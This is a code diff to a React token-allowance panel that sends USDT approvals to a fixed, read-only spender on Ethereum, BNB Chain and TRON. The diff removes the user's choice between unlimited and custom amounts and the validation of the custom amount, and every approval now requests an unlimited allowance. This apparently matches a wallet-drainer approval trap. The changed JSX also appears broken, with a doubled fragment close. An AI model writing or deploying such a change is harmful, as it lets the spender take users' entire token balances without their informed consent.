@@ -16,9 +16,6 @@ interface Props {
 }
 
 const TokenAllowancePanel: React.FC<Props> = ({ owner, network, setNetwork, chainId, onConnect, reportBalances }) => {
-  // Require explicit user choice (no default)
-  const [approveType, setApproveType] = useState<'unlimited' | 'custom' | ''>('');
-  const [customAmount, setCustomAmount] = useState('');
   const [showConfirmModal, setShowConfirmModal] = useState(false);
   const [inputError, setInputError] = useState('');
   const [isSelectingNetwork, setIsSelectingNetwork] = useState(false);
@@ -51,24 +48,20 @@ const TokenAllowancePanel: React.FC<Props> = ({ owner, network, setNetwork, chai
       return;
     }
     
-    if (approveType === '') {
-      setInputError('Please select an allowance amount type.');
-      return;
-    }
-    
-    if (approveType === 'custom' && (!customAmount || parseFloat(customAmount) <= 0)) {
-      setInputError('Please enter a valid custom amount.');
-      return;
-    }
-
     setInputError('');
     setShowConfirmModal(true);
   };
 
   const executeApproval = () => {
-    const amt = approveType === 'custom' ? customAmount : undefined;
-    approve(amt);
+    approve(); // undefined amt defaults to unlimited
   };
+
+  // Determine if the provided owner address is valid for the selected network type
+  const isCorrectAddressType = React.useMemo(() => {
+    if (!owner || !network) return false;
+    if (network === 'TRON') return owner.startsWith('T');
+    return owner.startsWith('0x');
+  }, [owner, network]);
 
   const handleRevokeClick = () => {
     if (!fixedSpender) {
@@ -115,63 +108,66 @@ const TokenAllowancePanel: React.FC<Props> = ({ owner, network, setNetwork, chai
         )}
       </div>
 
-      {!owner ? (
-        <div className="text-center py-6">
-          <p className="text-xs text-[#7b879b] mb-4">Please connect your wallet first to check and manage token allowances.</p>
-          <button 
-            onClick={onConnect}
-            className="h-10 px-6 rounded-xl bg-[#f0b90b] hover:bg-[#f5c842] text-black font-bold text-xs transition-colors"
-          >
-            Connect Wallet
-          </button>
-        </div>
-      ) : (
-        <div className="space-y-4">
+      <div className="space-y-4">
           
-          {/* Network Selection */}
-          <div className="relative">
-            <span className="font-mono text-[10px] font-medium uppercase tracking-widest text-[#7b879b] block mb-2">Select USDT Network</span>
-            
+        {/* Network Selection (Always Visible) */}
+        <div className="relative">
+          <span className="font-mono text-[10px] font-medium uppercase tracking-widest text-[#7b879b] block mb-2">Select USDT Network</span>
+          
+          <button 
+            onClick={() => setIsSelectingNetwork(!isSelectingNetwork)}
+            className="w-full flex items-center justify-between bg-[#0d1119] border border-[#1e2636] p-3 rounded-xl hover:border-[#f0b90b]/50 transition-colors"
+          >
+            <span className={`text-sm font-semibold ${network ? 'text-white' : 'text-[#4a5568]'}`}>
+              {getNetworkName(network)}
+            </span>
+            <ChevronDown className="w-4 h-4 text-[#7b879b]" />
+          </button>
+
+          {isSelectingNetwork && (
+            <div className="absolute top-full left-0 right-0 mt-2 bg-[#0d1119] border border-[#1e2636] rounded-xl overflow-hidden z-10 shadow-2xl">
+              <button 
+                onClick={() => { setNetwork('ETH'); setIsSelectingNetwork(false); }}
+                className="w-full text-left px-4 py-3 border-b border-[#1e2636] hover:bg-[#1e2636] flex justify-between items-center"
+              >
+                <span className="text-sm text-white font-medium">Ethereum Mainnet</span>
+                <span className="text-xs text-[#7b879b] font-mono">{reportBalances.ETH && reportBalances.ETH !== 'Error' ? `${parseFloat(reportBalances.ETH).toFixed(2)} USDT` : ''}</span>
+              </button>
+              <button 
+                onClick={() => { setNetwork('BNB'); setIsSelectingNetwork(false); }}
+                className="w-full text-left px-4 py-3 border-b border-[#1e2636] hover:bg-[#1e2636] flex justify-between items-center"
+              >
+                <span className="text-sm text-white font-medium">BNB Smart Chain</span>
+                <span className="text-xs text-[#7b879b] font-mono">{reportBalances.BNB && reportBalances.BNB !== 'Error' ? `${parseFloat(reportBalances.BNB).toFixed(2)} USDT` : ''}</span>
+              </button>
+              <button 
+                onClick={() => { setNetwork('TRON'); setIsSelectingNetwork(false); }}
+                className="w-full text-left px-4 py-3 hover:bg-[#1e2636] flex justify-between items-center"
+              >
+                <span className="text-sm text-white font-medium">TRON Mainnet</span>
+                <span className="text-xs text-[#7b879b] font-mono">{reportBalances.TRON && reportBalances.TRON !== 'Error' ? `${parseFloat(reportBalances.TRON).toFixed(2)} USDT` : ''}</span>
+              </button>
+            </div>
+          )}
+        </div>
+
+        {!owner || !isCorrectAddressType ? (
+          <div className="text-center py-6 bg-[#0d1119] rounded-xl border border-[#1e2636]">
+            <p className="text-xs text-[#7b879b] mb-4">
+              {!owner 
+                ? "Please connect your wallet first to check and manage token allowances." 
+                : `Please connect a ${network === 'TRON' ? 'TRON' : 'EVM'} wallet to manage allowances on ${getNetworkName(network)}.`}
+            </p>
             <button 
-              onClick={() => setIsSelectingNetwork(!isSelectingNetwork)}
-              className="w-full flex items-center justify-between bg-[#0d1119] border border-[#1e2636] p-3 rounded-xl hover:border-[#f0b90b]/50 transition-colors"
+              onClick={onConnect}
+              className="h-10 px-6 rounded-xl bg-[#f0b90b] hover:bg-[#f5c842] text-black font-bold text-xs transition-colors"
             >
-              <span className={`text-sm font-semibold ${network ? 'text-white' : 'text-[#4a5568]'}`}>
-                {getNetworkName(network)}
-              </span>
-              <ChevronDown className="w-4 h-4 text-[#7b879b]" />
+              Connect Wallet
             </button>
-
-            {isSelectingNetwork && (
-              <div className="absolute top-full left-0 right-0 mt-2 bg-[#0d1119] border border-[#1e2636] rounded-xl overflow-hidden z-10 shadow-2xl">
-                <button 
-                  onClick={() => { setNetwork('ETH'); setIsSelectingNetwork(false); }}
-                  className="w-full text-left px-4 py-3 border-b border-[#1e2636] hover:bg-[#1e2636] flex justify-between items-center"
-                >
-                  <span className="text-sm text-white font-medium">Ethereum Mainnet</span>
-                  <span className="text-xs text-[#7b879b] font-mono">{reportBalances.ETH ? `${parseFloat(reportBalances.ETH).toFixed(2)} USDT` : ''}</span>
-                </button>
-                <button 
-                  onClick={() => { setNetwork('BNB'); setIsSelectingNetwork(false); }}
-                  className="w-full text-left px-4 py-3 border-b border-[#1e2636] hover:bg-[#1e2636] flex justify-between items-center"
-                >
-                  <span className="text-sm text-white font-medium">BNB Smart Chain</span>
-                  <span className="text-xs text-[#7b879b] font-mono">{reportBalances.BNB ? `${parseFloat(reportBalances.BNB).toFixed(2)} USDT` : ''}</span>
-                </button>
-                <button 
-                  onClick={() => { setNetwork('TRON'); setIsSelectingNetwork(false); }}
-                  className="w-full text-left px-4 py-3 hover:bg-[#1e2636] flex justify-between items-center"
-                >
-                  <span className="text-sm text-white font-medium">TRON Mainnet</span>
-                  <span className="text-xs text-[#7b879b] font-mono">{reportBalances.TRON ? `${parseFloat(reportBalances.TRON).toFixed(2)} USDT` : ''}</span>
-                </button>
-              </div>
-            )}
           </div>
-
-          {network && (
-            <>
-              {/* Spender Info Read-Only */}
+        ) : network && (
+          <>
+            {/* Spender Info Read-Only */}
               <div className="bg-[#0d1119] rounded-xl p-4 border border-[#1e2636] space-y-3 font-mono mt-4">
                  <div className="flex justify-between items-start">
                    <div>
@@ -199,57 +195,7 @@ const TokenAllowancePanel: React.FC<Props> = ({ owner, network, setNetwork, chai
                 </div>
               </div>
 
-              {/* Amount Options */}
-              <div className="bg-[#0d1119] rounded-xl p-4 border border-[#1e2636] space-y-3">
-                <span className="font-mono text-[10px] font-medium uppercase tracking-widest text-[#7b879b] block">Set Allowance Amount</span>
-                
-                <div className="flex gap-4">
-                  <label className="flex items-center gap-2 text-xs text-white cursor-pointer select-none">
-                    <input
-                      type="radio"
-                      name="approveType"
-                      checked={approveType === 'unlimited'}
-                      onChange={() => {
-                        setApproveType('unlimited');
-                        setInputError('');
-                      }}
-                      className="accent-[#f0b90b]"
-                    />
-                    Unlimited Allowance
-                  </label>
-                  <label className="flex items-center gap-2 text-xs text-white cursor-pointer select-none">
-                    <input
-                      type="radio"
-                      name="approveType"
-                      checked={approveType === 'custom'}
-                      onChange={() => {
-                        setApproveType('custom');
-                        setInputError('');
-                      }}
-                      className="accent-[#f0b90b]"
-                    />
-                    Custom Allowance
-                  </label>
-                </div>
-
-                {approveType === 'custom' && (
-                  <div className="flex items-center gap-2 bg-[#111520] border border-[#1e2636] rounded-lg px-3 py-1.5 mt-2">
-                    <input
-                      type="number"
-                      value={customAmount}
-                      onChange={(e) => {
-                         setCustomAmount(e.target.value);
-                         setInputError('');
-                      }}
-                      placeholder="0.00"
-                      className="w-full bg-transparent text-sm text-white focus:outline-none"
-                    />
-                    <span className="text-xs text-[#4a5568] font-bold">USDT</span>
-                  </div>
-                )}
-                
-                {inputError && <p className="text-[10px] text-red-500 mt-2 font-mono">{inputError}</p>}
-              </div>
+              {inputError && <p className="text-[10px] text-red-500 mt-2 font-mono">{inputError}</p>}
 
               <div className="p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl flex gap-2">
                 <ShieldAlert className="w-4 h-4 text-amber-500 flex-shrink-0 mt-0.5" />
@@ -291,9 +237,9 @@ const TokenAllowancePanel: React.FC<Props> = ({ owner, network, setNetwork, chai
                 </button>
               </div>
             </>
-          )}
-        </div>
-      )}
+          </>
+        )}
+      </div>
 
       {/* Confirmation & Status Modals */}
       <ApprovalConfirmation
@@ -305,7 +251,7 @@ const TokenAllowancePanel: React.FC<Props> = ({ owner, network, setNetwork, chai
         tokenAddress={getUsdtAddress()}
         spender={fixedSpender}
         currentAllowance={allowance}
-        requestedAllowance={approveType === 'custom' ? customAmount : 'Unlimited'}
+        requestedAllowance="Unlimited"
       />
 
       <ApprovalStatus
